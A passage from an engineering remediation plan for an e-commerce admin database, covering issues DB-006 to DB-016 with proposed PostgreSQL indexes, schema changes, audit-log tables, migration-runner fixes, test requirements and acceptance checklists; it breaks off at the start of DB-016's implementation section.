Every refund records an amount, timestamp and actor; partial refunds are representable; revenue reporting can compute `paid - refunded` correctly.

**Dependencies:**
- **Blocks** BUG-010, BUG-031, ECOM-002.
- **Related** DB-015.

**Testing Requirements:**
- Full refund writes `refund_amount = amount`.
- Partial refund accumulates correctly across two events.
- `refund_amount > amount` → CHECK violation.
- Backfill produces the documented approximation for legacy rows.
- Reports compute `paid - refunded` matching the fixtures.

**Acceptance Criteria:**
- [x] Three columns added with CHECK and FK.
- [x] Drizzle matches.
- [x] Legacy backfill documented and applied.
- [x] Cumulative-refund semantics documented.
- [x] Schema parity passes.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-006 — Missing indexes for hot query paths

**Priority:** P1
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/server/repositories/*.ts
```

**Problem Description:**
Several query shapes used by the application have no supporting index. Verified gaps against the queries actually executed:

| Query path | Predicate / join | Existing index | Gap |
|---|---|---|---|
| Order list "latest payment" lateral (BUG-016) | `payments(order_id) ORDER BY created_at DESC LIMIT 1` | `idx_payments_order_id` | needs `(order_id, created_at DESC)` |
| Payments queue default sort | `ORDER BY created_at DESC` filtered by `status` | `idx_payments_status` | needs `(status, created_at DESC)` |
| Inventory list | `inventory` filtered by computed available stock, ordered by `updated_at` | none | `(updated_at DESC)`; partial indexes for low/out |
| Inventory movements feed | `inventory_movements ORDER BY created_at DESC` | `idx_inventory_movements_variant (variant_id)` | needs `(created_at DESC)` and `(variant_id, created_at DESC)` |
| Products by price (BUG-014) | `MIN(product_variants.price) per product` | `idx_product_variants_product_id` | needs `(product_id, price)` |
| Coupons list (BUG-030) | derived status expression + `ORDER BY` | `idx_coupons_code(lower(code))` | needs `(starts_at, expires_at)` only if measured slow — evaluate first |
| Customers list | `LEFT JOIN orders ON customer_id` + `ORDER BY created_at` | `idx_orders_customer_id` | `(customer_id, status)` to make the aggregate index-only — evaluate |
| Order search | `ILIKE '%term%'` on `order_number`, `contact_phone`, customer names | none | B-tree cannot serve leading-wildcard; see §9.5 for the trigram/pg_trgm option — **requires an extension, treat as Requires Investigation** |

**Current Implementation:**
Index list verified from `initial_schema.sql:94-534` (19 indexes) and `phase3_schema_refinements.sql:36` (1 index). None of the composite indexes above exist.

**Root Cause:**
Indexes were added per-column as tables were created, not derived from actual query predicates.

**Real-World Failure Scenario:**
At 50k orders, the payments queue (`ORDER BY created_at DESC` with a status filter) sorts the full table on every page load; the orders list evaluates a per-row lateral sort. Both degrade linearly and the admin console becomes unusable exactly when volume matters most.

**Required Implementation:**

1. Create a new migration (DB-015) with `CREATE INDEX CONCURRENTLY IF NOT EXISTS` (non-transactional — see DB-015):
   ```sql
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_payments_order_created
     ON payments (order_id, created_at DESC);
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_payments_status_created
     ON payments (status, created_at DESC);
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_inventory_movements_created
     ON inventory_movements (created_at DESC);
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_inventory_movements_variant_created
     ON inventory_movements (variant_id, created_at DESC);
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_variants_product_price
     ON product_variants (product_id, price);
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_inventory_updated
     ON inventory (updated_at DESC);
   ```
2. Add **partial** indexes only after measuring; do not create speculative indexes:
   ```sql
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_inventory_low
     ON inventory ((quantity_on_hand - quantity_reserved))
     WHERE (quantity_on_hand - quantity_reserved) <= reorder_level;
   ```
   Note: a partial index with a predicate referencing two columns of the same row is valid; verify the planner uses it for the low-stock count.
3. Mirror every index in the corresponding Drizzle schema file so `drizzle-kit` does not try to create or drop them.
4. Measure with `EXPLAIN (ANALYZE, BUFFERS)` before and after; record actual plans. **Do not invent improvement percentages.**
5. Do not add `pg_trgm` in this issue. If order search is slow, open a separate investigation (§9.5) because `CREATE EXTENSION` requires elevated privileges and is a schema-level decision.

**Expected Behavior After Fix:**
Each listed query has a supporting index; the planner reports `Index Scan`/`Index Only Scan` instead of `Seq Scan` + `Sort` for the filtered, ordered cases; write overhead remains acceptable (measure insert latency on `payments`).

**Dependencies:**
- **Depends on** BUG-014/BUG-016 landing (the queries must exist first).
- **Related** DB-016 (audit for unused indexes), PERF-003.

**Testing Requirements:**
- `EXPLAIN` for each path shows index usage with representative data volumes (>= 10k rows in staging).
- Index creation completes without locking writes (`CONCURRENTLY`).
- No duplicate/overlapping index remains (DB-016).
- Insert throughput on `payments` measured before/after.

**Acceptance Criteria:**
- [x] Six indexes created concurrently.
- [x] Partial index evaluated, created only if used.
- [x] Drizzle mirrors all indexes.
- [x] Plans recorded before/after.
- [x] No speculative indexes.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-007 — `order_coupons` has no release/audit semantics

**Priority:** P2
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/server/repositories/coupon.repository.ts
src/server/services/coupon.service.ts
```

**Problem Description:**
`order_coupons (order_id, coupon_id, discount_amount, created_at)` is append-only with a composite PK. It records a redemption but has no way to record a *release* (cancellation/refund, BUG-007). The only options today are deleting the row (losing the audit trail) or leaving it (over-counting usage forever).

**Current Implementation:**
Table at `initial_schema.sql:468-473`; `recordRedemption` inserts and increments `coupons.usage_count` (`coupon.repository.ts:240-256`); nothing decrements.

**Root Cause:**
Coupons were modelled as "redeemed or not", without the reversal lifecycle that orders already had (ADR 020 distinguishes four cancellation scenarios for stock; coupons got none).

**Real-World Failure Scenario:**
See BUG-007. Operationally, after adding release support, an auditor asking "how many times was WELCOME10 used in October" cannot answer if rows are deleted.

**Required Implementation:**

1. Add release columns instead of deleting:
   ```sql
   ALTER TABLE order_coupons
     ADD COLUMN IF NOT EXISTS released_at timestamptz,
     ADD COLUMN IF NOT EXISTS release_reason text
       CHECK (release_reason IS NULL OR release_reason IN ('order_cancelled','order_refunded','admin_correction'));
   ```
2. Change `usage_count` maintenance to be computed from live redemptions rather than a mutable counter — **or** keep the counter but mandate that every insert/release updates it in the same transaction. Recommendation for this phase: keep the counter (it is used by `validateAndLockForOrder` under a row lock, which is correct and cheap), and make release the exact inverse.
3. `recordRedemption` → insert row; `releaseRedemption` → `UPDATE … SET released_at = now(), release_reason = $2 WHERE order_id = $1 AND released_at IS NULL` + `usage_count = GREATEST(usage_count - 1, 0)`. Idempotent by the `released_at IS NULL` guard.
4. Unique constraint: `PRIMARY KEY (order_id, coupon_id)` already prevents double redemption of the same coupon on one order.
5. Add an index `(coupon_id, released_at)` for usage reporting.

**Expected Behavior After Fix:**
Redemptions and releases are both auditable; `usage_count` equals live redemptions; reports can distinguish "used" from "used then released".

**Dependencies:**
- **Depends on** BUG-007 (call site).
- **Related** DB-003.

**Testing Requirements:**
- Redeem → `usage_count` +1, row live.
- Release → `usage_count` −1, `released_at` set.
- Release twice → no double decrement.
- Report query `count(*) WHERE released_at IS NULL` equals `usage_count`.

**Acceptance Criteria:**
- [x] Columns added with CHECK.
- [x] Release service method implemented idempotently.
- [x] Counter equals live redemptions.
- [x] Usage report query documented.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-008 — `order_number` collision audit required before switching to the sequence

**Priority:** P0
**Category:** Database
**Severity:** High
**Verification Status:** Requires Investigation

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/server/services/order.service.ts
```

**Problem Description:**
Before BUG-005 can be deployed, the existing `order_number` values must be inspected. Because the application has been generating `SX-` + last-6-milliseconds, values are not ordered, may collide (prevented by the unique constraint, so a collision manifests as a failed insert rather than duplicate data), and may collide with the *future* sequence range (e.g. an existing `SX-1001` created by the timestamp generator would clash with the next sequence value).

**Current Implementation:**
Unique constraint `orders.order_number` (SQL `:366`); sequence `order_number_seq START WITH 1001` (`:21`).

**Root Cause:**
Not a defect in itself — a required verification step that cannot be performed without database access.

**Real-World Failure Scenario:**
If an existing timestamp order is literally `SX-1001`, the first sequence-generated number collides and the retry logic in BUG-005 would loop. Without the audit, the migration is unsafe.

**Required Implementation:**

1. Run on the target database (§8.2 Q3):
   ```sql
   SELECT count(*) AS total,
          count(*) FILTER (WHERE order_number ~ '^SX-[0-9]{1,4}$') AS short_numeric,
          min(order_number) FILTER (WHERE order_number ~ '^SX-[0-9]+$') AS min_num,
          max(order_number) FILTER (WHERE order_number ~ '^SX-[0-9]+$') AS max_num
   FROM orders;
   SELECT order_number FROM orders WHERE order_number ~ '^SX-[0-9]+$' ORDER BY length(order_number), order_number LIMIT 20;
   ```
2. Compute the required starting value: `GREATEST(1001, max(numeric suffix) + 1)` and run:
   ```sql
   SELECT setval('order_number_seq', <computed>, false);
   ```
3. **Do not renumber existing orders** — invoices and customer communications reference them.
4. Record the audit output in the migration's header comment so the decision is reproducible.

**Expected Behavior After Fix:**
The sequence starts above every existing numeric order number; no future collision is possible.

**Dependencies:**
- **Blocks** BUG-005 deployment.
- **Related** ECOM-007.

**Testing Requirements:**
- Audit query executed; results recorded.
- `setval` applied; the next created order gets a number greater than every existing one.
- No existing row modified.

**Acceptance Criteria:**
- [ ] Audit executed (prerequisite: DB access).
- [ ] `setval` computed and applied.
- [ ] Recorded in the migration header.
- [ ] No renumbering.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-009 — `product_images.imagekit_file_id` must be nullable

**Priority:** P1
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/catalog.ts
src/server/validation/catalog.ts
src/server/services/product.service.ts
```

**Problem Description:**
`product_images.imagekit_file_id` is `NOT NULL` in SQL and `notNull()` in Drizzle. Externally hosted product photography (added by URL in the admin form) has no ImageKit ID, so the application fabricates one (BUG-021). The column must permit `NULL` to model reality.

**Current Implementation:**
SQL `initial_schema.sql:202-215`: `imagekit_file_id text NOT NULL`; Drizzle `src/db/schema/catalog.ts` matching; `productImageInputSchema.imagekitFileId` required (`catalog.ts:106`).

**Root Cause:**
The column was designed for the ImageKit-only upload path and later exposed to URL entry without a schema change.

**Real-World Failure Scenario:**
See BUG-021 — plus any future cleanup job that assumes non-null IDs are real ImageKit objects will attempt deletions for fabricated IDs.

**Required Implementation:**

1. Migration:
   ```sql
   ALTER TABLE product_images ALTER COLUMN imagekit_file_id DROP NOT NULL;
   ```
   This is a catalog-only change (no table rewrite) and takes `ACCESS EXCLUSIVE` briefly.
2. Pre-clean the fabricated values (§8.2 Q8) **after** the column is nullable:
   ```sql
   UPDATE product_images SET imagekit_file_id = NULL
   WHERE imagekit_file_id ~ '^img-[0-9]+-[0-9a-z]+$';
   ```
   Run inside a transaction, after a backup, and only on rows whose `url` is not an ImageKit URL. Provide the count before and after.
3. Update Drizzle to drop `.notNull()`.
4. Update `productImageInputSchema` to optional/nullable with the ImageKit ID regex.
5. Update `toProductBundleDTO`/`toProductListItemDTO` to tolerate `null` (BUG-021 step 5).

**Expected Behavior After Fix:**
URL-only images store `NULL`; no fabricated identifiers exist; deletion code skips `NULL`.

**Dependencies:**
- **Depends on** BUG-021 (call-site changes).
- **Related** SEC-009, ECOM-008.

**Testing Requirements:**
- Insert a row with `imagekit_file_id = NULL` → succeeds.
- Cleanup query affects exactly the fabricated rows (count verified).
- Real ImageKit rows untouched.
- Product renders with mixed null/non-null images.

**Acceptance Criteria:**
- [ ] Column nullable in SQL and Drizzle.
- [ ] Fabricated values cleaned with a recorded count.
- [ ] Schema validators updated.
- [ ] No deletion attempt for null IDs.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-010 — `customers.user_id` uniqueness and orphan semantics

**Priority:** P2
**Category:** Database
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/customers.ts
src/server/repositories/customer.repository.ts
```

**Problem Description:**
`customers.user_id text UNIQUE REFERENCES ba_user(id) ON DELETE SET NULL` is correct, but the application never populates it. `isRegistered` is derived from `user_id IS NOT NULL` (`customer.repository.ts:52-54,132`), so **every** customer is classified as "guest" regardless of truth, and the `isRegistered` filter returns nothing. This is a data-model gap rather than a schema bug: the column exists and is well-formed, but nothing links a customer to an auth user.

**Current Implementation:**
SQL `:252-262`; Drizzle `src/db/schema/customers.ts`; `upsertCustomer` (`customer.repository.ts:205-260`) accepts no `userId`.

**Root Cause:**
The storefront (which would own registration) is out of this repository's scope, and the admin app has no flow to attach a `ba_user` to a `customers` row.

**Real-World Failure Scenario:**
A customer registers on the storefront and tracks an order. In the admin panel they remain "guest", so the "registered customers" filter shows zero and marketing cannot segment by account status.

**Required Implementation:**

1. Confirm the intended linking rule: **`customers.user_id` is set when the storefront creates a `ba_user`** and matched by normalised email.
2. In this repository, support the field in `upsertCustomer` (`userId?: string | null`) and in `createOrder`'s customer resolution (match an existing `ba_user` by email when provided).
3. Backfill query for existing data (§8.2 Q9):
   ```sql
   UPDATE customers c SET user_id = u.id
   FROM ba_user u
   WHERE c.user_id IS NULL AND lower(trim(c.email)) = lower(trim(u.email)) AND u.role = 'customer';
   ```
   **Requires production write access + approval.** Do not run automatically.
4. Add an explicit `isRegistered` semantics note to `DATABASE_CONTEXT.md`: derived purely from `user_id`, never from `email`.

**Expected Behavior After Fix:**
`isRegistered` reflects reality once links exist; the filter returns correct sets. Until the storefront writes `user_id`, the column remains a truthful "not linked" state rather than a wrong one.

**Dependencies:**
- **Related** DB-001 (email normalisation), BUG-029.

**Testing Requirements:**
- Customer with `user_id` → `isRegistered = true`.
- Customer without → `false`.
- `upsertCustomer` with `userId` persists it.
- Backfill (if run) produces no duplicate `user_id` (UNIQUE enforces).

**Acceptance Criteria:**
- [ ] `upsertCustomer` accepts `userId`.
- [ ] Filter verified with fixtures.
- [ ] Backfill optional, documented, requiring approval.
- [ ] Semantics documented.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-011 — Customer notes have no table (scalar text column only)

**Priority:** P2
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/customers.ts
src/lib/dto.ts
src/views/CustomerDetail.tsx
```

**Problem Description:**
Staff notes are stored as a single `customers.notes text` column. The UI presents them as a timestamped, author-attributed list but no such data exists. This is the schema half of BUG-025.

**Current Implementation:**
`customers.notes text` (SQL `:259`), `notes: text("notes")` (Drizzle `src/db/schema/customers.ts:26`), rendered as one fabricated note in `dto.ts:196-206`.

**Root Cause:**
Notes began as a single free-text field and the UI evolved into a list without a corresponding schema change.

**Real-World Failure Scenario:**
See BUG-025: notes merge, lose authorship, and cannot be audited.

**Required Implementation:**

1. New table (migration DB-015):
   ```sql
   CREATE TABLE IF NOT EXISTS customer_notes (
     id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
     customer_id uuid NOT NULL REFERENCES customers(id) ON DELETE CASCADE,
     body text NOT NULL CHECK (trim(body) <> ''),
     created_by text REFERENCES ba_user(id) ON DELETE SET NULL,
     created_at timestamptz NOT NULL DEFAULT now()
   );
   CREATE INDEX IF NOT EXISTS idx_customer_notes_customer_created
     ON customer_notes (customer_id, created_at DESC);
   ALTER TABLE customer_notes ENABLE ROW LEVEL SECURITY;
   ```
   RLS with zero policies matches the existing lockdown convention (every other table does this — verified: all 27 tables enable RLS and no policies exist).
2. Migration of existing data: split `customers.notes` on the `\n---\n` delimiter. Use `regexp_split_to_table`:
   ```sql
   INSERT INTO customer_notes (customer_id, body, created_by, created_at)
   SELECT c.id, trim(part), NULL, c.updated_at
   FROM customers c, regexp_split_to_table(c.notes, E'\\n---\\n') AS part
   WHERE c.notes IS NOT NULL AND trim(c.notes) <> '' AND trim(part) <> '';
   ```
   Run **once**; guard with a `WHERE NOT EXISTS (SELECT 1 FROM customer_notes n WHERE n.customer_id = c.id)` so re-running is safe.
3. Keep `customers.notes` for one release; set it to `NULL` only after verification, and keep the column (do not drop) so the change is reversible.
4. Add Drizzle definitions and relations; add `customerNotes` to the schema barrel.

**Expected Behavior After Fix:**
Notes are discrete rows; the legacy column is preserved but unused.

**Dependencies:**
- **Depends on** BUG-025 (service/UI wiring lands with it).
- **Related** ECOM-004.

**Testing Requirements:**
- Legacy blob with 3 segments → 3 rows, order preserved.
- Re-running the migration inserts nothing.
- New notes insert and list correctly.
- Deleting a customer cascades notes.
- RLS enabled.

**Acceptance Criteria:**
- [x] Table created with FK, index, RLS.
- [x] Legacy rows migrated once, count verified.
- [x] `customers.notes` retained but unused.
- [x] Drizzle in sync.

**Implementation Complexity:** Medium

- [x] Completed

---

### DB-012 — `inventory_movements.reason` lacks `correction`/`return` semantics for reversals

**Priority:** P2
**Category:** Database
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/inventory.ts
src/server/services/inventory.service.ts
src/server/validation/inventory.ts
```

**Problem Description:**
The movement ledger records `restock | sale | cancellation | adjustment | return` (Drizzle CHECK, DB-004 makes it real). Two events introduced by this plan have no accurate reason: an admin reversing a mistaken payment (BUG-011) and a refund that restores stock (BUG-010 pre-shipment). Today both would be logged as `cancellation` or `adjustment`, which misrepresents them in the audit ledger.

**Current Implementation:**
`inventoryMovementReasonEnum` in `src/server/validation/inventory.ts`; Drizzle CHECK at `src/db/schema/inventory.ts:63-66`. `adjustStock` accepts a caller-supplied reason from the enum.

**Root Cause:**
The enum was defined with the initial order lifecycle and not extended for reversal flows.

**Real-World Failure Scenario:**
Stock returns to the warehouse after a payment correction. The ledger says `cancellation` for an order that was never cancelled, so a stock reconciliation cannot distinguish "customer cancelled" from "clerk fixed a mistake". Shrinkage investigations lose their signal.

**Required Implementation:**

1. Extend the enum with `correction` and `payment_reversal` **only if** they are needed by BUG-010/BUG-011; otherwise reuse `adjustment` and document that mapping. Recommended minimum: add `correction`.
2. Migration (DB-004's companion):
   ```sql
   ALTER TABLE inventory_movements DROP CONSTRAINT IF EXISTS chk_inventory_movements_reason;
   ALTER TABLE inventory_movements ADD CONSTRAINT chk_inventory_movements_reason
     CHECK (reason IN ('restock','sale','cancellation','adjustment','return','correction'));
   ```
3. Update `inventoryMovementReasonEnum`, the Drizzle CHECK, and every service call site.
4. Do **not** rewrite historical rows.

**Expected Behavior After Fix:**
Each stock change is recorded with a reason that reflects what actually happened.

**Dependencies:**
- **Depends on** BUG-010, BUG-011 (call sites), DB-004.
- **Related** ECOM-002.

**Testing Requirements:**
- New reasons accepted; old ones still accepted.
- Invalid reason rejected.
- Movement history UI renders the new labels (update the label map).
- Historical rows unchanged.

**Acceptance Criteria:**
- [ ] Enum and CHECK updated together.
- [ ] Call sites use the accurate reason.
- [ ] UI labels updated.
- [ ] No historical rewrite.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-013 — `payments.transaction_reference` has no uniqueness guard

**Priority:** P2
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/payments.ts
src/server/repositories/payment.repository.ts
```

**Problem Description:**
The same bank/wallet transaction reference can be submitted against multiple payments — deliberately or by mistake — and the database permits it silently. Duplicate-TID fraud (one transfer claimed twice) is undetectable with the current schema.

**Current Implementation:**
`transaction_reference text` with no constraint (SQL `:499`); `idx_payments_status` and `idx_payments_order_id` only.

**Root Cause:**
The reference was treated as free-text metadata rather than an external identifier with global scope.

**Real-World Failure Scenario:**
A customer transfers PKR 5,300 once and submits the same TID screenshot for two orders. Both approvals succeed; the second order ships without payment. Detection requires a manual search the UI cannot perform.

**Required Implementation:**

1. **Do not add a blanket unique constraint** — `NULL`s and legitimate re-submissions (a rejected proof retried) must be allowed, and existing duplicates may already exist.
2. Add a **partial** unique index on non-null, non-empty values per payment method:
   ```sql
   CREATE UNIQUE INDEX CONCURRENTLY IF NOT EXISTS uq_payments_txn_ref
     ON payments (payment_method_id, transaction_reference)
     WHERE transaction_reference IS NOT NULL AND transaction_reference <> '';
   ```
   Include `payment_method_id` because TID namespaces differ per provider (a JazzCash TID and a bank reference can theoretically coincide).
3. **Pre-check first** (§8.3): find duplicates and resolve them manually (a legitimate duplicate must be documented — e.g. two partial instalments referencing the same transfer).
4. Instead of relying only on a hard constraint (which would block legitimate correction flows), implement a **soft duplicate detector** in `payment.service.submitPaymentProof`: on submit, if another payment with the same `(payment_method_id, transaction_reference)` exists and is not `rejected`, flag `metadata.duplicateReference = { paymentId, orderId }` and surface it in the payments queue with a warning badge.
5. Add a non-unique supporting index for the lookup:
   ```sql
   CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_payments_method_txn
     ON payments (payment_method_id, transaction_reference);
   ```
6. Decide the final policy and document it: hard constraint **or** soft flag. Recommendation: soft flag now (no data risk), hard constraint once the audit is clean and a correction procedure exists.

**Expected Behavior After Fix:**
Duplicate references are visible in the verification queue at approval time. Once the data is clean and the policy adopted, the database prevents them.

**Dependencies:**
- **Depends on** BUG-008 (state model), DB-005.
- **Related** ECOM-006 (this is the schema half of that feature).

**Testing Requirements:**
- Submit the same TID twice → second is flagged, not silently accepted.
- Rejected second attempt with a corrected TID → no flag.
- Different payment methods with the same reference → no flag.
- Duplicate audit query executed and clean before any unique index.

**Acceptance Criteria:**
- [ ] Duplicate audit executed.
- [ ] Soft flag implemented and surfaced in the UI.
- [ ] Supporting index exists.
- [ ] Policy documented; hard constraint deferred with a stated condition.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-014 — No audit log for privileged mutations

**Priority:** P2
**Category:** Database
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
supabase/migrations/
src/server/action-client.ts
src/db/schema/
```

**Problem Description:**
There is no audit trail for administrative actions. `order_status_history` covers order transitions only; `inventory_movements` covers stock. Price changes, product deletions, coupon edits, settings changes, payment approvals and refunds leave no record of *who* did *what* and *when* beyond the single `verified_by`/`created_by` columns that happen to exist.

Verified: `grep -rn "audit" supabase/migrations/*.sql src/db/schema/*.ts` returns only a comment in `json-types.ts` about rejection history.

**Current Implementation:**
`createSafeAction` (`src/server/action-client.ts`) resolves `admin` and calls the handler — no logging hook exists.

**Root Cause:**
Auditing was assumed to be covered by domain-specific history tables, which only exist for orders and stock.

**Real-World Failure Scenario:**
A product's price is changed from PKR 3,500 to PKR 350 for an hour. Orders flood in at the wrong price. Nobody can determine who changed it, when, or from which screen. Without an audit log the loss is unrecoverable and undisputable.

**Required Implementation:**

1. New table (migration DB-015):
   ```sql
   CREATE TABLE IF NOT EXISTS audit_logs (
     id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
     actor_id text REFERENCES ba_user(id) ON DELETE SET NULL,
     actor_role text,
     action text NOT NULL,              -- e.g. 'product.update'
     entity_type text NOT NULL,
     entity_id text,
     before jsonb,
     after jsonb,
     metadata jsonb NOT NULL DEFAULT '{}',
     created_at timestamptz NOT NULL DEFAULT now()
   );
   CREATE INDEX IF NOT EXISTS idx_audit_logs_entity ON audit_logs (entity_type, entity_id, created_at DESC);
   CREATE INDEX IF NOT EXISTS idx_audit_logs_actor ON audit_logs (actor_id, created_at DESC);
   CREATE INDEX IF NOT EXISTS idx_audit_logs_created ON audit_logs (created_at DESC);
   ALTER TABLE audit_logs ENABLE ROW LEVEL SECURITY;
   ```
2. Emit from `createSafeAction` **only for mutating actions** — pass an `audit` config: `{ action: "product.update", entity: "product", getEntityId: (i) => i.id }`. Do not attempt generic before/after diffing in the wrapper; let each service supply `before`/`after` where it already has them (product update, settings update, payment approve/refund).
3. Write the audit row **inside the same transaction** as the mutation so it cannot diverge (pass `tx` down), or, where the action is not transactional, after success with an explicit comment.
4. Never log secrets, proof URLs, full addresses, or payment references in `metadata` — redact to ids and amounts.
5. Build a minimal read-only `/settings/audit` (or a tab on Settings) restricted to `super_admin` — **defer to Phase 5**; the schema and emission are what Phase 2–3 need.
6. Retention: document a 180-day policy; no automatic deletion in this phase.

**Expected Behavior After Fix:**
Every privileged mutation produces one audit row with actor, action, entity and timestamp, queryable by entity or actor.

**Dependencies:**
- **Related** ARCH-006 (structured logging), SEC-013.

**Testing Requirements:**
- Update a product → one row with `action='product.update'`, actor, entity id.
- Approve a payment → one row; refund → one row.
- Failed action (validation error) → no row.
- Transaction rollback → no orphan audit row.
- No secret/PII in the payload.

**Acceptance Criteria:**
- [ ] Table + indexes + RLS created.
- [ ] Mutations emit rows.
- [ ] Transactional consistency verified.
- [ ] PII redaction rules documented and tested.
- [ ] Read UI deferred with a recorded follow-up.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### DB-015 — Migration runner cannot execute `CONCURRENTLY` statements or non-transactional DDL

**Priority:** P1
**Category:** Database
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/db/migrate.ts
supabase/migrations/
supabase/migrations/meta/_journal.json
```

**Problem Description:**
`src/db/migrate.ts` executes **every** migration file inside `client.begin(...)`:
```ts
await client.begin(async (sql) => {
  await sql.unsafe(sqlContent);
  await sql`INSERT INTO _app_migrations (name) VALUES (${file})`;
});
```
PostgreSQL refuses `CREATE INDEX CONCURRENTLY`, `ALTER TYPE … ADD VALUE`, and `VACUUM` inside a transaction block. Every index-creation migration in this plan (DB-001, DB-003, DB-006, DB-013) therefore cannot be applied by the project's own runner. `supabase/migrations/meta/_journal.json` is `{"entries":[]}` — Drizzle's own journal is empty, so Drizzle Kit is not tracking anything either.

Additionally, the runner baselines only `20261105000000_initial_schema.sql`, and applies files in lexical order — which is fine while timestamps are used, but there is no dependency declaration.

**Current Implementation:**
`src/db/migrate.ts` (read in full): creates `_app_migrations`, baselines the first file, executes pending files sequentially, each wrapped in a transaction.

**Root Cause:**
The runner was written for simple DDL and never encountered a statement that requires running outside a transaction.

**Real-World Failure Scenario:**
An engineer adds the `CONCURRENTLY` index migration from DB-006 and runs `npm run db:migrate`. It fails with `CREATE INDEX CONCURRENTLY cannot run inside a transaction block`, the transaction rolls back, `_app_migrations` records nothing, and the migration is stuck. The engineer works around it by pasting SQL into the Supabase console — leaving no record.

**Required Implementation:**

1. Support an explicit non-transactional marker. Adopt a convention: a file whose **first line** is `-- migrate:no-transaction` is executed outside a transaction.
   ```ts
   const sqlContent = fs.readFileSync(fullPath, "utf-8");
   const noTx = sqlContent.startsWith("-- migrate:no-transaction");
   if (noTx) {
     await client.unsafe(sqlContent);
     await client`INSERT INTO _app_migrations (name) VALUES (${file})`;
   } else {
     await client.begin(async (sql) => { await sql.unsafe(sqlContent); await client`INSERT …`; });
   }
   ```
   Record the flag in the journal so a re-run cannot change semantics: add `non_transactional boolean` to `_app_migrations`.
2. Handle partial failure for non-transactional files: on error, **do not** insert the journal row; log the exact statement context so an operator can resume manually. Document that `CONCURRENTLY` migrations are resumable (an `IF NOT EXISTS` index that already exists is a no-op).
3. Add a **checksum** column (`sha256` of the file) to detect post-hoc edits of applied migrations; refuse to run if a previously applied file's checksum changed.
4. Add a dry-run mode (`npm run db:migrate -- --dry-run`) that lists pending files and their transaction mode without executing.
5. Keep the existing baseline behaviour (never break an already-migrated database).
6. Every migration added by this plan must start with a comment declaring: purpose, transaction mode, pre-checks required, and rollback steps.
7. Do not switch to Drizzle Kit's `migrate` in this issue — the project's SQL-first convention (ADR 011) is intentional. Document the `_journal.json` emptiness as expected.

**Expected Behavior After Fix:**
`CONCURRENTLY` migrations run successfully through `npm run db:migrate`; every applied file is checksummed; partial failures are visible and resumable.

**Dependencies:**
- **Blocks** DB-001, DB-003, DB-006, DB-013 (all need `CONCURRENTLY`).
- **Related** §8.

**Testing Requirements:**
- A no-transaction file with `CREATE INDEX CONCURRENTLY` applies successfully on a scratch DB.
- A transactional file still rolls back fully on error.
- Journal records the mode and checksum.
- Editing an applied file makes the runner refuse.
- Dry run lists the correct pending set.

**Acceptance Criteria:**
- [x] Marker convention implemented.
- [x] `non_transactional` and `checksum` columns added to `_app_migrations`.
- [x] Dry-run mode exists.
- [x] Partial-failure handling documented.
- [x] Existing migrations unaffected.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### DB-016 — Index and constraint audit for duplication and unused objects

**Priority:** P3
**Category:** Database
**Severity:** Low
**Verification Status:** Requires Investigation

**Affected Files:**
```
supabase/migrations/*.sql
src/db/schema/*.ts
```

**Problem Description:**
Because SQL and Drizzle diverged (DB-002, DB-003, DB-004), the live database may contain duplicate or unused indexes. This cannot be determined from the repository; it requires `pg_stat_user_indexes` on the production database.

**Current Implementation:**
19 indexes in `initial_schema.sql`, 1 in `phase3_schema_refinements.sql`, plus all primary keys and unique constraints. Drizzle declares a partially different set (e.g. `index("idx_coupons_code").on(table.code)` vs SQL `ON coupons(lower(code))`).

**Root Cause:**
Schema objects were authored in two places over several phases without a diffing step.

**Real-World Failure Scenario:**
Write amplification on `orders` and `payments` from redundant indexes, and `drizzle-kit push` (if ever used) dropping a production index that the SQL migrations assume exists.

**Required Implementation:**

